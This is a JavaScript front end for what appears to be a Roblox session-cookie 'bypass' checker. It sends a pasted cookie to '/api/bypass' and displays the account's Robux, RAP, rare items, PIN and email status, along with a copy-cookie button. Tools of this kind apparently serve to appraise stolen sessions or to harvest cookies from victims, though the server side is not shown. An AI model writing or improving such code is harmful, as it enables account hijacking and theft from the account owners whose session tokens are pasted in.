const cookieInput = document.getElementById('cookie-input');
const btnCheck = document.getElementById('btn-check');
const btnCopy = document.getElementById('btn-copy');

const inputState = document.getElementById('input-state');
const resultsState = document.getElementById('results-state');
const failedState = document.getElementById('failed-state');
const loadingState = document.getElementById('loading-state');

// Check Cookie
btnCheck.onclick = async () => {
    const cookie = cookieInput.value.trim();

    if (!cookie) {
        alert('Please paste your cookie');
        return;
    }

    // Show loading
    inputState.classList.add('hidden');
    loadingState.classList.remove('hidden');

    try {
        const response = await fetch('/api/bypass', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie, checkOnly: true })
        });

        const data = await response.json();

        if (!response.ok || !data.success || !data.valid) {
            loadingState.classList.add('hidden');
            failedState.classList.remove('hidden');
            return;
        }

        // Populate results
        document.getElementById('user-avatar').src = data.avatarUrl || 'https://via.placeholder.com/150';
        document.getElementById('display-name').textContent = data.displayName || data.username;
        document.getElementById('username').textContent = `@${data.username}`;
        document.getElementById('user-id').textContent = data.userId;
        document.getElementById('robux').textContent = data.robux?.toLocaleString() || '0';
        document.getElementById('pending-robux').textContent = data.pendingRobux?.toLocaleString() || '0';
        document.getElementById('rap').textContent = data.rap?.toLocaleString() || '0';
        document.getElementById('account-age').textContent = data.accountAge || '0 Days';
        document.getElementById('pin-enabled').textContent = data.pinEnabled || 'NO';
        document.getElementById('voice-chat').textContent = data.voiceChat || 'NO';
        document.getElementById('email-verified').textContent = data.emailVerified || 'NO';
        document.getElementById('headless').textContent = data.headless || 'NO';
        document.getElementById('korblox').textContent = data.korblox || 'NO';
        document.getElementById('groups-owned').textContent = data.groupsOwned || '0';
        document.getElementById('credit').textContent = data.credit || '$0';
        document.getElementById('cookie-display').value = cookie;

        // Show results
        loadingState.classList.add('hidden');
        resultsState.classList.remove('hidden');

    } catch (err) {
        console.error(err);
        loadingState.classList.add('hidden');
        failedState.classList.remove('hidden');
    }
};

// Copy Cookie
btnCopy.onclick = () => {
    const cookieDisplay = document.getElementById('cookie-display');
    cookieDisplay.select();
    document.execCommand('copy');
    
    btnCopy.textContent = 'COPIED!';
    btnCopy.classList.add('bg-blue-500', 'text-white');
    
    setTimeout(() => {
        btnCopy.textContent = 'COPY COOKIE';
        btnCopy.classList.remove('bg-blue-500', 'text-white');
    }, 2000);
};

// Enter key support
cookieInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') btnCheck.click();
});
